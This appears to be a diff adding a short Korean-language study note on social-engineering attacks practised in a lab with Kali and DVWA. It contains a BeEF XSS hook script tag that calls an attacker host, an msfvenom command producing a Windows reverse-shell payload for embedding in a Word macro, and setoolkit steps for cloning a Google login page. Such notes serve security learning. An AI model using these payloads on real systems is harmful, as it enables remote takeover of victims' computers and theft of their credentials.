@@ -1,0 +1,27 @@
+사회공학기법공격 : 시스템을 공격하는 것이 아닌 시스템을 사용하는 사람을 공격하는 것 [No Sysytem is Safe]
+
+XSS(Cross Site Scripting)
+웹 페이지를 열 때 악성코드를 삽입하여 코드들이 실행되게 하는 공격
+
+apt install beef-xss (xss 실습 툴)
+beef-xss (beef framework 사이트 이동)
+
+Hook : <script src="http://<IP>:3000/hook.js"></script> = 악성스크립트 삽입코드
+DVWA에서 위 명령을 삽입하면 Beef 창에 사용자 컴퓨터가 연결된다.
+Details에서 사용자 컴퓨터의 다양한 정보들을 얻을 수 있음
+Commands =>Redirect Broswer 에 원하는 사이트 입력 후 Execute를 누르면 공격자 사이트로 이동함.
+
+[악성스크립트]
+msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=192.168.0.103 LPORT=7777 -f vba-psh > res.txt
+악성코드 생성 & res.txt에 저장
+이 후 이 코드를 워드파일 매크로에 붙여넣기 하고 저장하면 뒤에 워드파일을 열 때 마다 악성코드가 실행된다. 이를 통해 공격자서버(kali)에서
+windows의 Shell을 얻게되어 공격이 가능해진다.
+
+[피싱공격]
+사이트를 똑같이 만들어놓은 가짜 사이트에 로그인하게 만들어 정보를 빼내는 공격기법
+
+setoolkit : 사회공학기법 도구모음
+1231Enter2
+이후 windows에서 크롬에서 kali서버 IP주소를 입력하면 Google 사이트가 그대로 뜸.
+
+
